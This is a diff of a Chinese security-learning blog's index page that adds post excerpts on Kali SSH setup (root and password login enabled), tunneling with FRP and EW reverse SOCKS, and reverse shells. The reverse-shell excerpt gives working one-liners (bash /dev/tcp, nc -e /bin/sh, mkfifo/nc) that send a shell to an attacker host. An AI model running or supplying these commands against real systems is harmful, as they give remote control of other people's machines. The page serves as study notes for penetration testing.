@@ -151,6 +151,171 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-HTML标签集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/17/HTML%E6%A0%87%E7%AD%BE%E9%9B%86/">HTML标签集</a>
+    </h1>
+  
+
+        
+        <a href="/2020/12/17/HTML%E6%A0%87%E7%AD%BE%E9%9B%86/" class="archive-article-date">
+  	<time datetime="2020-12-17T08:43:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="HTML标签集"><a href="#HTML标签集" class="headerlink" title="HTML标签集"></a>HTML标签集</h1>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">HTML</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/12/17/HTML%E6%A0%87%E7%AD%BE%E9%9B%86/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-kali安装完后的初始配置" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/17/kali%E5%AE%89%E8%A3%85%E5%AE%8C%E5%90%8E%E7%9A%84%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE/">kali安装完后的初始配置</a>
+    </h1>
+  
+
+        
+        <a href="/2020/12/17/kali%E5%AE%89%E8%A3%85%E5%AE%8C%E5%90%8E%E7%9A%84%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE/" class="archive-article-date">
+  	<time datetime="2020-12-17T07:59:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Kali初始化配置——启用SSH"><a href="#Kali初始化配置——启用SSH" class="headerlink" title="Kali初始化配置——启用SSH"></a><strong>Kali初始化配置——启用SSH</strong></h1><h2 id="启用SSH"><a href="#启用SSH" class="headerlink" title="启用SSH"></a><strong>启用SSH</strong></h2><p>vi /etc/ssh/sshd_config                  #修改config文件内容</p>
+<p>PasswordAuthentication yes        #修改内容</p>
+<p>PermitRootLogin yes                      #修改 允许root用户登录</p>
+<p>修改完成示例：</p>
+<p>root@kali:~# vi /etc/ssh/sshd_config</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"># $OpenBSD: sshd_config,v 1.103 2018&#x2F;04&#x2F;09 20:41:22 tj Exp $</span><br><span class="line"></span><br><span class="line"># This is the sshd server system-wide configuration file.  See</span><br><span class="line"># sshd_config(5) for more information.</span><br><span class="line"></span><br><span class="line"># This sshd was compiled with PATH&#x3D;&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;sbin</span><br><span class="line"></span><br><span class="line"># The strategy used for options in the default sshd_config shipped with</span><br><span class="line"># OpenSSH is to specify options with their default value where</span><br><span class="line"># possible, but leave them commented.  Uncommented options override the</span><br><span class="line"># default value.</span><br><span class="line"></span><br><span class="line">Include &#x2F;etc&#x2F;ssh&#x2F;sshd_config.d&#x2F;*.conf</span><br><span class="line"></span><br><span class="line">#Port 22</span><br><span class="line">#AddressFamily any</span><br><span class="line">#ListenAddress 0.0.0.0</span><br><span class="line">#ListenAddress ::</span><br><span class="line"></span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"># Ciphers and keying</span><br><span class="line">#RekeyLimit default none</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">#SyslogFacility AUTH</span><br><span class="line">#LogLevel INFO</span><br><span class="line"></span><br><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">#LoginGraceTime 2m</span><br><span class="line">#PermitRootLogin prohibit-password</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">#StrictModes yes</span><br><span class="line">#MaxAuthTries 6</span><br><span class="line">#MaxSessions 10</span><br><span class="line"></span><br><span class="line">#PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line"># Expect .ssh&#x2F;authorized_keys2 to be disregarded by default in future.</span><br><span class="line">#AuthorizedKeysFile     .ssh&#x2F;authorized_keys .ssh&#x2F;authorized_keys2</span><br><span class="line"></span><br><span class="line">#AuthorizedPrincipalsFile none</span><br><span class="line"></span><br><span class="line">#AuthorizedKeysCommand none</span><br><span class="line">#AuthorizedKeysCommandUser nobody</span><br><span class="line"></span><br><span class="line"># For this to work you will also need host keys in &#x2F;etc&#x2F;ssh&#x2F;ssh_known_hosts</span><br><span class="line">#HostbasedAuthentication no</span><br><span class="line"># Change to yes if you don&#39;t trust ~&#x2F;.ssh&#x2F;known_hosts for</span><br><span class="line"># HostbasedAuthentication</span><br><span class="line">#IgnoreUserKnownHosts no</span><br><span class="line"># Don&#39;t read the user&#39;s ~&#x2F;.rhosts and ~&#x2F;.shosts files</span><br><span class="line">#IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line"># To disable tunneled clear text passwords, change to no here!</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">#PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"># Change to yes to enable challenge-response passwords (beware issues with</span><br><span class="line"># some PAM modules and threads)</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"># Kerberos options</span><br><span class="line">#KerberosAuthentication no</span><br><span class="line">#KerberosOrLocalPasswd yes</span><br><span class="line">#KerberosTicketCleanup yes</span><br><span class="line">#KerberosGetAFSToken no</span><br><span class="line"></span><br><span class="line"># GSSAPI options</span><br><span class="line">#GSSAPIAuthentication no</span><br><span class="line">#GSSAPICleanupCredentials yes</span><br><span class="line">#GSSAPIStrictAcceptorCheck yes</span><br><span class="line">#GSSAPIKeyExchange no</span><br><span class="line"></span><br><span class="line"># Set this to &#39;yes&#39; to enable PAM authentication, account processing,</span><br><span class="line"># and session processing. If this is enabled, PAM authentication will</span><br><span class="line"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="line"># PasswordAuthentication.  Depending on your PAM configuration,</span><br><span class="line"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="line"># the setting of &quot;PermitRootLogin without-password&quot;.</span><br><span class="line"># If you just want the PAM account and session checks to run without</span><br><span class="line"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="line"># and ChallengeResponseAuthentication to &#39;no&#39;.</span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line">#AllowAgentForwarding yes</span><br><span class="line">#AllowTcpForwarding yes</span><br><span class="line">#GatewayPorts no</span><br><span class="line">X11Forwarding yes</span><br><span class="line">#X11DisplayOffset 10</span><br><span class="line">#X11UseLocalhost yes</span><br><span class="line">#PermitTTY yes</span><br><span class="line">PrintMotd no</span><br><span class="line">#PrintLastLog yes</span><br><span class="line">#TCPKeepAlive yes</span><br><span class="line">#PermitUserEnvironment no</span><br><span class="line">#Compression delayed</span><br><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br><span class="line">#UseDNS no</span><br><span class="line">#PidFile &#x2F;var&#x2F;run&#x2F;sshd.pid</span><br><span class="line">#MaxStartups 10:30:100</span><br><span class="line">#PermitTunnel no</span><br><span class="line">#ChrootDirectory none</span><br><span class="line">#VersionAddendum none</span><br><span class="line"></span><br><span class="line"># no default banner path</span><br><span class="line">#Banner none</span><br><span class="line"></span><br><span class="line"># Allow client to pass locale environment variables</span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line"># override default of no subsystems</span><br><span class="line">Subsystem       sftp    &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;sftp-server</span><br><span class="line"></span><br><span class="line"># Example of overriding settings on a per-user basis</span><br><span class="line">#Match User anoncvs</span><br><span class="line">#       X11Forwarding no</span><br><span class="line">#       AllowTcpForwarding no</span><br><span class="line">#       PermitTTY no</span><br><span class="line">#       ForceCommand cvs server</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="启动SSH服务"><a href="#启动SSH服务" class="headerlink" title="启动SSH服务"></a>启动SSH服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo /etc/init.d/ssh start <span class="comment">#启动服务</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">sudo /etc/init.d/ssh status <span class="comment">#查看服务状态</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="添加SSH自启动"><a href="#添加SSH自启动" class="headerlink" title="添加SSH自启动"></a>添加SSH自启动</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo update-rc.d ssh <span class="built_in">enable</span> <span class="comment">#添加ssh开启自动启动</span></span></span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kali</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/12/17/kali%E5%AE%89%E8%A3%85%E5%AE%8C%E5%90%8E%E7%9A%84%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-信道隐藏" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -182,7 +347,33 @@
 <p><strong>端口转发</strong>只能实现外网到内网的单向通信。（为什么？）</p>
 <p>转发是一种与其他网络应用程序交互的方式。在SSH连接的一端，SSH截取其他程序的服务请求，将其通过加密的SSH连接发送，传给另一端的适当服务接收者。多数情况下，这一过程对连接的两端而言都是透明的：每端都相信它在与对方直接对话，丝毫意识不到转发的存在。SSH转发还有更强大的功能，可以实现几种原来无法实现的通信。</p>
 <p><strong>端口多路复用（**</strong>Port address Translation,PAT)**是指改变外出数据包的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%BA%90%E7%AB%AF%E5%8F%A3">源端口</a>并进行端口转换，即端口<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">地址转换</a>（PAT，Port Address Translation).采用端口多路复用方式。内部网络的所有<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>均可共享一个合法外部IP地址实现对Internet的访问，从而可以最大限度地节约IP地址资源。同时，又可隐藏网络内部的所有<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>，有效避免来自internet的攻击。因此，目前网络中应用最多的就是端口多路复用方式。</p>
-<h1 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h1>
+<h1 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h1><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
+<p>frp 主要由客户端(frpc)和服务端(frps)组成，服务端部署在具有公⽹ IP 的机器上，客户端部署在需要穿<br>透的内⽹服务所在的机器上</p>
+<p>服务端配置文件</p>
+<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229115659517.png" alt="image-20201229115659517"></p>
+<p>客户端配置文件</p>
+<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229115723915.png" alt="image-20201229115723915"></p>
+<blockquote>
+<p> local_port本地要映射出去的端口</p>
+<p> remote_port  要映射成的公网端口</p>
+</blockquote>
+<p>连接</p>
+<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229115952583.png" alt="image-20201229115952583"></p>
+<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229120010011.png" alt="image-20201229120010011"></p>
+<h2 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h2><h2 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
+<p>VPS：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 10800 -e 18888</span><br></pre></td></tr></table></figure>
+
+<p>内网机器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win.exe -s rssocks -p vpsip -e 18888</span><br></pre></td></tr></table></figure>
+
+<p>网络配置代理</p>
+<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229131121395.png" alt="image-20201229131121395"></p>
+<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229131134890.png" alt="image-20201229131134890"></p>
+<h2 id="端口复用（TcpTunnel）"><a href="#端口复用（TcpTunnel）" class="headerlink" title="端口复用（TcpTunnel）"></a>端口复用（TcpTunnel）</h2><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/YDHCUI/TcpTunnel">https://github.com/YDHCUI/TcpTunnel</a></p>
+<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229132259934.png" alt="image-20201229132259934"></p>
+<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229132458792.png" alt="image-20201229132458792"></p>
+
       
 
       
@@ -261,7 +452,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h1><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p>
+        <h1 id="原理篇"><a href="#原理篇" class="headerlink" title="原理篇"></a>原理篇</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p>
 <p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
 <blockquote>
 <p>标准输入standard input 0 （默认设备键盘）</p>
@@ -272,25 +463,42 @@
 <p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
 <p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
 <h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
-<p>（1）输入重定向 &lt; &lt;&lt;</p>
-<p>（2）输出重定向 &gt; &gt;&gt;</p>
+<p>（1）输入重定向&lt;   &lt;&lt;  (单箭头会覆写，双箭头表示为追加)</p>
+<p>（2）输出重定向 &gt;   &gt;&gt;</p>
 <hr>
 <ol>
-<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
-</li>
-<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
-</li>
-<li><p>&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p>
-</li>
+<li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</li>
+<li>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</li>
+<li>&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</li>
 </ol>
+<h3 id="重定向执行顺序"><a href="#重定向执行顺序" class="headerlink" title="重定向执行顺序"></a><strong>重定向执行顺序</strong></h3><p>shell会按照;等分隔符将一串命令分成多个命令，替换命令中的变量后执行单条命令</p>
+<p>待定</p>
 <h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a><strong>输入重定向</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： [n]&lt; word     （注意[n]与&lt;之间没有空格）</span><br></pre></td></tr></table></figure>
 
+<h4 id="将输入重定向到文件‘test-input’"><a href="#将输入重定向到文件‘test-input’" class="headerlink" title="将输入重定向到文件‘test_input’"></a>将输入重定向到文件‘test_input’</h4><p>新建一个文件‘test_input’,内容是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217163827724.png" alt="image-20201217163827724"></p>
+<p>使用输入重定向</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">bash&lt;test_input </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217163947161.png" alt="image-20201217163947161"></p>
 <h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a><strong>输出重定向</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： [n]&gt; word    （注意[n]与&gt;之间没有空格）</span><br></pre></td></tr></table></figure>
 
+<p>将输出重定向到文件‘test_out’</p>
+<p>使用输出重定向</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> 123&gt;test_out</span></span><br></pre></td></tr></table></figure>
+
+<p>查看文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim test_out</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217172050051.png" alt="image-20201217172050051"></p>
 <h3 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a><strong>标准输出与标准错误输出重定向</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： &amp;&gt; word &gt;&amp; word</span><br></pre></td></tr></table></figure>
 
+<h4 id="错误输出重定向测试"><a href="#错误输出重定向测试" class="headerlink" title="错误输出重定向测试"></a>错误输出重定向测试</h4><p>以输入不存在的命名来测试</p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217172816252.png" alt="image-20201217172816252"></p>
 <blockquote>
-<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的)</p>
+<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，**&amp;是为了区分文件1和文件描述符1的**)</p>
 </blockquote>
 <h3 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a><strong>文件描述符的复制</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： [n]&lt;&amp;[m] &#x2F; [n]&gt;&amp;[m] (这里所有字符之间不要有空格)</span><br></pre></td></tr></table></figure>
 
@@ -348,7 +556,98 @@
 
 <p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
 </blockquote>
+<h1 id="应用篇"><a href="#应用篇" class="headerlink" title="应用篇"></a>应用篇</h1><h2 id="命令确定⽬标⽀持的反弹⽅式"><a href="#命令确定⽬标⽀持的反弹⽅式" class="headerlink" title="命令确定⽬标⽀持的反弹⽅式"></a>命令确定⽬标⽀持的反弹⽅式</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nc bash python ruby php exec lua perl java  //可依据需要添加其他语言</span><br></pre></td></tr></table></figure>
 
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228112501467.png" alt="image-20201228112501467"></p>
+<h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.92.***.***/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228145300805.png" alt="image-20201228145300805"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228145428668.png" alt="image-20201228145428668"></p>
+<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc ip port -e /bin/sh</span><br><span class="line">nc.traditional ip port -e /bin/sh</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc ip port &gt;/tmp/f    ##没有e参数，结合管道命令进⾏反弹</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150131526.png" alt="image-20201228150131526"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150113360.png" alt="image-20201228150113360"></p>
